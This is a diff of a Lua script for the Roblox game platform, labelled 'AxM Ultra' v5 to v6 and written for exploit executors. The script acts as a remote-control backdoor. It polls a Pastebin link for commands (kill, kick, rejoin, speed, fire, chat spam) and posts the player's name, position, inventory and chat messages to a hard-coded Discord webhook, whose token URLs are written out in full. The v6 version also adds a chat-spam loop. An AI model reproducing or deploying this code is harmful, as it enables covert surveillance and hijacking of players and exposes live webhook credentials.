@@ -1,7 +1,7 @@
 local settings = {
-    webhook = "https://discord.com/api/webhooks/1465277476962959382/x_Q2S4Ow3XD_dEX7CEno1hh2ObzUZAyTjtMSJtq7vyDZL5wdiDv7Lfbcq8tlIKg5Df6p",
-    control = "https://pastebin.com/raw/VfCXKNdB", -- ТВОЯ НОВАЯ ССЫЛКА
-    check_delay = 1.5 -- Оптимально для быстрого отклика
+    webhook = "https://discord.com/api/webhooks/1465626358351794206/Vd6C9UGjjUhiH5xUdy1rv2AbwPwRqQIHrozSDyW1a0k5VoNd2k_-d2U3PgurZVkRMbl0",
+    control = "https://pastebin.com/raw/VfCXKNdB",
+    check_delay = 0.8
 }
 
 local Players = game:GetService("Players")
@@ -11,23 +11,24 @@ local Lighting = game:GetService("Lighting")
 local TeleportService = game:GetService("TeleportService")
 local lp = Players.LocalPlayer
 
--- Функция для запросов (поддержка всех популярных эксплойтов)
 local function requestFunc(options)
-    local fn = (syn and syn.request) or (http and http.request) or http_request or request or (fluxus and fluxus.request)
-    if fn then return fn(options) end
+    local req = (syn and syn.request) or (http and http.request) or http_request or request or (fluxus and fluxus.request)
+    if req then return req(options) end
 end
 
 local function getInventory()
     local tools = {}
     pcall(function()
         for _, v in ipairs(lp.Backpack:GetChildren()) do if v:IsA("Tool") then table.insert(tools, v.Name) end end
-        if lp.Character then for _, v in ipairs(lp.Character:GetChildren()) do if v:IsA("Tool") then table.insert(tools, v.Name .. " (E)") end end end
+        if lp.Character then
+            for _, v in ipairs(lp.Character:GetChildren()) do if v:IsA("Tool") then table.insert(tools, v.Name .. " (E)") end end
+        end
     end)
     return #tools > 0 and table.concat(tools, ", ") or "Empty"
 end
 
-local function sendLog(title, desc, color, wait_for_finish)
-    local function execute()
+local function sendLog(title, desc, color)
+    task.spawn(function()
         local pos = "Unknown"
         pcall(function() 
             if lp.Character and lp.Character:FindFirstChild("HumanoidRootPart") then 
@@ -35,121 +36,121 @@ local function sendLog(title, desc, color, wait_for_finish)
                 pos = string.format("%.1f, %.1f, %.1f", p.X, p.Y, p.Z) 
             end 
         end)
-        
         local gameName = "Game"
         pcall(function() gameName = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name end)
-        local joinUrl = "https://www.roblox.com/games/"..game.PlaceId.."?jobId="..game.JobId
-
         local data = {
             ["embeds"] = {{
                 ["title"] = title,
                 ["description"] = desc,
                 ["color"] = color or 0xFF0000,
                 ["fields"] = {
-                    {["name"] = "👤 Игрок", ["value"] = "`"..lp.Name.."`", ["inline"] = true},
-                    {["name"] = "🎮 Игра", ["value"] = "["..gameName.."]("..joinUrl..")", ["inline"] = true},
-                    {["name"] = "📍 Позиция", ["value"] = "`"..pos.."`", ["inline"] = true},
-                    {["name"] = "🎒 Инвентарь", ["value"] = "```"..getInventory().."```", ["inline"] = false}
+                    {["name"] = "👤 Player", ["value"] = "`"..lp.Name.."`", ["inline"] = true},
+                    {["name"] = "🎮 Game", ["value"] = gameName, ["inline"] = true},
+                    {["name"] = "📍 Position", ["value"] = "`"..pos.."`", ["inline"] = true},
+                    {["name"] = "🎒 Inventory", ["value"] = "```"..getInventory().."```", ["inline"] = false}
                 },
-                ["footer"] = {["text"] = "AxM Ultra v5 • "..os.date("%X")}
+                ["footer"] = {["text"] = "AxM Ultra v6 • "..os.date("%X")}
             }}
         }
-        return requestFunc({Url = settings.webhook, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = HttpService:JSONEncode(data)})
-    end
-
-    if wait_for_finish then execute() else task.spawn(execute) end
+        requestFunc({Url = settings.webhook, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = HttpService:JSONEncode(data)})
+    end)
 end
 
-local current_config = {
-    speed = 16,
-    jump = 50,
-    lagging = false
-}
+local current_config = { speed = 16, jump = 50, lagging = false, spamming = false, hijacking = nil }
 
--- Стабилизатор характеристик (чтобы античит не сбрасывал скорость)
+-- Постоянное применение настроек (Speed/Jump)
 task.spawn(function()
     while true do
-        task.wait(0.3)
-        pcall(function()
-            local hum = lp.Character and lp.Character:FindFirstChildOfClass("Humanoid")
-            if hum then
-                if hum.WalkSpeed ~= current_config.speed then hum.WalkSpeed = current_config.speed end
-                if current_config.jump > 50 then 
-                    hum.JumpPower = current_config.jump 
-                    hum.UseJumpPower = true 
-                end
-            end
-        end)
+        task.wait(0.1)
+        local char = lp.Character
+        local hum = char and char:FindFirstChildOfClass("Humanoid")
+        if hum then
+            hum.WalkSpeed = current_config.speed
+            hum.JumpPower = current_config.jump
+            hum.UseJumpPower = true
+        end
     end
 end)
 
--- ГЛАВНЫЙ ЦИКЛ КОНТРОЛЯ (С защитой от кэширования)
+-- ГЛАВНЫЙ ЦИКЛ КОНТРОЛЯ
 task.spawn(function()
-    local last_cmd = ""
-    print("AxM: Control Loop Started")
-    
-    while true do
-        -- Генерируем уникальный URL, чтобы обойти кэш Pastebin
-        local cache_buster = "?cb=" .. tick() .. "&r=" .. math.random(1, 10000)
-        local success, response = pcall(function()
-            return game:HttpGet(settings.control .. cache_buster)
-        end)
+    local last_cmd = "safe"
+    warn("AxM V6: ONLINE. Waiting for commands...")
 
-        if success and response and #response > 0 then
+    while true do
+        local response = nil
+        local cache_buster = settings.control .. "?t=" .. tick()
+        
+        -- Попытка 1: Стандартный HttpGet
+        local s, r = pcall(function() return game:HttpGet(cache_buster) end)
+        if s then response = r end
+        
+        -- Попытка 2: Если HttpGet не сработал, пробуем через запрос читов
+        if not response then
+            local req = requestFunc({Url = cache_buster, Method = "GET", Headers = {["Cache-Control"] = "no-cache"}})
+            if req and req.Body then response = req.Body end
+        end
+
+        if response then
             local clean_res = response:match("^%s*(.-)%s*$") or ""
             local current_cmd = clean_res:lower()
 
-            if current_cmd ~= last_cmd and current_cmd ~= "safe" and current_cmd ~= "" then
+            if current_cmd ~= last_cmd then
                 last_cmd = current_cmd
-                
-                -- Логика команд
-                if current_cmd:find("kick") then
-                    local reason = clean_res:match("%((.-)%)") or "Disconnected by admin"
-                    sendLog("🚪 KICKED", "Reason: "..reason, 0xFF4500, true)
-                    task.wait(0.5)
-                    lp:Kick(reason)
-                    
-                elseif current_cmd == "kill" then
-                    sendLog("💀 KILL", "Player executed", 0xFF0000, true)
+                print("NEW COMMAND: " .. current_cmd)
+
+                if current_cmd == "kill" then
+                    sendLog("💀 KILL", "Eliminated via panel", 0xFF0000)
                     if lp.Character and lp.Character:FindFirstChildOfClass("Humanoid") then
                         lp.Character:FindFirstChildOfClass("Humanoid").Health = 0
                     end
-                    
-                elseif current_cmd:find("speed") then
-                    local val = tonumber(clean_res:match("%((%d+)%)")) or 16
-                    current_config.speed = val
-                    sendLog("⚡ SPEED", "New: "..val, 0x00FFFF)
-                    
-                elseif current_cmd:find("jump") then
-                    local val = tonumber(clean_res:match("%((%d+)%)")) or 50
-                    current_config.jump = val
-                    sendLog("🚀 JUMP", "New: "..val, 0x00FFFF)
-
-                elseif current_cmd == "rejoin" then
-                    sendLog("🔄 REJOIN", "Reconnecting...", 0x2ECC71, true)
+                elseif current_cmd:find("kick") then
+                    local reason = clean_res:match("%((.-)%)") or "Bye!"
+                    sendLog("🚪 KICK", "Reason: "..reason, 0xFF4500)
                     task.wait(0.5)
+                    lp:Kick(reason)
+                elseif current_cmd == "rejoin" then
+                    sendLog("🔄 REJOIN", "Reconnecting...", 0x2ECC71)
                     TeleportService:Teleport(game.PlaceId, lp)
-                    
-                elseif current_cmd == "lag" then
-                    current_config.lagging = true
-                    sendLog("📶 LAG", "Lag machine started")
+                elseif current_cmd:find("speed") then
+                    current_config.speed = tonumber(clean_res:match("%((%d+)%)")) or 16
+                    sendLog("⚡ SPEED", "New: "..current_config.speed, 0x3498DB)
+                elseif current_cmd:find("jump") then
+                    current_config.jump = tonumber(clean_res:match("%((%d+)%)")) or 50
+                    sendLog("🚀 JUMP", "New: "..current_config.jump, 0x3498DB)
+                elseif current_cmd == "fire" then
+                    if lp.Character and lp.Character:FindFirstChild("HumanoidRootPart") then
+                        local f = Instance.new("Fire", lp.Character.HumanoidRootPart)
+                        f.Name = "AxMFire"
+                        sendLog("🔥 FIRE", "Enabled", 0xE67E22)
+                    end
+                elseif current_cmd == "unfire" then
+                    if lp.Character and lp.Character:FindFirstChild("HumanoidRootPart") then
+                        local f = lp.Character.HumanoidRootPart:FindFirstChild("AxMFire")
+                        if f then f:Destroy() end
+                        sendLog("💧 UNFIRE", "Disabled", 0x34495E)
+                    end
+                elseif current_cmd:find("chat_spam") then
+                    local msg = clean_res:match("%((.-)%)") or "..."
+                    current_config.spamming = true
+                    sendLog("💬 SPAM", "Msg: "..msg, 0x1ABC9C)
                     task.spawn(function()
-                        while current_config.lagging do
-                            for i=1, 200000 do local _ = math.sin(i) end
-                            RunService.Heartbeat:Wait()
+                        local event = game:GetService("ReplicatedStorage"):FindFirstChild("SayMessageRequest", true)
+                        while current_config.spamming do
+                            if event then event:FireServer(msg, "All") end
+                            task.wait(0.7)
                         end
                     end)
-                elseif current_cmd == "unlag" then
-                    current_config.lagging = false
-                    sendLog("📶 UNLAG", "System restored")
+                elseif current_cmd == "stop_spam" then
+                    current_config.spamming = false
+                elseif current_cmd == "safe" then
+                    -- Просто сброс, лог не нужен
                 end
-            elseif current_cmd == "safe" then
-                last_cmd = "safe"
             end
         end
         task.wait(settings.check_delay)
     end
 end)
 
-lp.Chatted:Connect(function(m) sendLog("💬 ЧАТ", "`" .. m .. "`", 0x3498DB) end)
-sendLog("🛰️ SYSTEM", "Connected to Control: VfCXKNdB\nStatus: Monitoring...", 0x00FF00)
+lp.Chatted:Connect(function(m) sendLog("💬 CHAT", "`" .. m .. "`", 0x3498DB) end)
+sendLog("🛰️ SYSTEM ONLINE", "Control link: " .. settings.control, 0x2ECC71)
